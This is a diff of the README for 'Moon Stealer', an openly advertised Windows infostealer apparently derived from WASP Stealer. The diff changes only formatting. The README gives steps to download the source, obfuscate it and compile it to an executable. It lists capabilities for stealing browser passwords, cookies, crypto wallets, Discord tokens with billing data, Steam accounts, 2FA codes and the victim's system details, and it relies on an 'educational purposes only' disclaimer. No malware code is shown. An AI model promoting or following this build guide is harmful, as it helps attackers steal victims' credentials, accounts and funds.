@@ -6,10 +6,11 @@
 ### Based on WASP Stealer.
 
 ### Requirements:
+
 - **Few braincells**
 - **Windows 10 / 11**
 - **Python:** [v3.10](https://www.python.org/downloads/release/python-3100/)
- 
+
 ### Setup
 
 1. [Download source code zip](https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
@@ -25,9 +26,8 @@
 6. Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.com/pyd) (Recommended)
 
 7. Run `Convert-To-Exe.py` to convert it to a .exe file type.
- 
-8. check ur dist folder for your executable
 
+8. check ur dist folder for your executable
 
 <a id="features"></a>
 
@@ -36,46 +36,51 @@
 ### Features
 
 - Browser Stealer
-    - Steal Saved Passwords
-    - Steal Cookies
+
+  - Steal Saved Passwords
+  - Steal Cookies
 
 - Wallet Stealer
-    - Steal Metamask wallets
-    - Steal Exodus Wallet
-    - Steal Atomic Wallet
+
+  - Steal Metamask wallets
+  - Steal Exodus Wallet
+  - Steal Atomic Wallet
 
 - Discord Stealer
-    - Steal Discord Tokens from browsers
-    - Steal Discord Token from discord, discordcanary, discordPTBa
+
+  - Steal Discord Tokens from browsers
+  - Steal Discord Token from discord, discordcanary, discordPTBa
 
 - Discord Token
-    - Nitro
-    - Badges
-    - Billing
-    - Email
-    - Phone
-    - HQ Friends
+
+  - Nitro
+  - Badges
+  - Billing
+  - Email
+  - Phone
+  - HQ Friends
 
 - Gaming
-    - Steal Steam Launcher accounts
-    - Steal Nation Glory Launcher accounts
+
+  - Steal Steam Launcher accounts
+  - Steal Nation Glory Launcher accounts
 
 - File Stealer
-    - Search User PC for Passwords, 2fa codes, tokens, wallets...
-    - Browsers: Opera, Chrome, Brave, Yandex, Edge
+
+  - Search User PC for Passwords, 2fa codes, tokens, wallets...
+  - Browsers: Opera, Chrome, Brave, Yandex, Edge
 
 - Extras
-    - Gets information of the victim's system
-    
+  - Gets information of the victim's system
+
 ## Screenshots
 
 <img src="https://media.discordapp.net/attachments/1072325721130799206/1072630431012368426/My_project-1.png" width="444"></img>
 <img src="https://media.discordapp.net/attachments/1071893829218746409/1072633366354071703/My_project-1_1.png" width="444"></img>
 <img src="https://media.discordapp.net/attachments/1071893829218746409/1072634930472947723/Screenshot_2023-02-07_4.47.43_PM.png" width="444"></img>
 
-
 ## Important
- 
+
 I am not responsible for any damage this software may cause; This program was made for educational purposes only.
 
 ## License
@@ -83,6 +88,7 @@ I am not responsible for any damage this software may cause; This program was ma
 Moon Stealer is licensed under the <a href="https://mit-license.org/">MIT License</a>.
 
 ## Errors?
+
 - Make an [issue](https://github.com/Yuvi5001/moon-stealer/issues)
 - Join the [Discord](https://discord.gg/fnNd26Depz)
 
